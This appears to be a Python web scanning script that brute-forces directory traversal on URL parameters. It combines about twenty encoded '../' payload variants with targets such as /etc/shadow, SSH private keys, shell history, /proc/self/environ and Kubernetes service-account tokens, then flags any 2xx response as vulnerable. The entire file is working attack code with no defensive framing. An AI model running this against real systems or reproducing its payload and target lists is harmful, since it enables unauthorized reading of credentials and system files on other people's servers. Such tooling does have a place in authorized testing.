import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin, urlparse
import sys

def Dirtraversal(urll,s,param):
	parameters=param
	payload=["../","..\\","..\/","%2e%2e%2f","%252e%252e%252f","%c0%ae%c0%ae%c0%af","%uff0e%uff0e%u2215","%uff0e%uff0e%u2216","%u002e%u002e%u2215","%u002e%u002e%u002e%u002e%u2215%u2215","%u002e%u002e%u2216","%c0%2e%c0%2e%c0%af","%c0%2e%c0%2e%c0%2e%c0%2e%c0%af%c0%af","%e0%40%ae%e0%40%ae%e0%80%af","%e0%40%ae%e0%40%ae%e0%40%ae%e0%40%ae%e0%80%af%e0%80%af","%c0ae%c0ae%c0%2f","%c0ae%c0ae%c0ae%c0ae%c0%2f%c0%2f","..././","...\.\\","..;/"]
	paths=["/etc/issue","/etc/passwd","/etc/shadow","/etc/group","/etc/hosts","/etc/motd","/etc/mysql/my.cnf","/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)","/proc/self/environ","/proc/version","/proc/cmdline","/proc/sched_debug","/proc/mounts","/proc/net/arp","/proc/net/route","/proc/net/tcp","/proc/net/udp","/proc/self/cwd/index.php","/proc/self/cwd/main.py","/home/$USER/.bash_history","/home/$USER/.ssh/id_rsa","/run/secrets/kubernetes.io/serviceaccount/token","/run/secrets/kubernetes.io/serviceaccount/namespace","/run/secrets/kubernetes.io/serviceaccount/certificate","/var/run/secrets/kubernetes.io/serviceaccount", "/var/lib/mlocate/mlocate.db","/var/lib/mlocate.db" ]
	def Dirtraversal(pa):
		newurl=pa
		for i in payload:
			for c in range(1,6):
					for j in paths:
						new=newurl+i*c+j
						response = s.get(new)
						if response.status_code>=200 and response.status_code<300:
							print(response.status_code)
							print(new+" is vulnerable to directory traversal")
		

	def dirinit(ins):
		if "=" in ins:
			x = ins.split("=")
			print(x)
			m=len(x)
			if m==2:
				xx=x[0]+"="
				Dirtraversal(xx)
			if m==3:
				xx=x[0]+"="+x[1]+"="
				Dirtraversal(xx)
		else:
			Dirtraversal(ins)


	for i in param:
		dirinit(i)
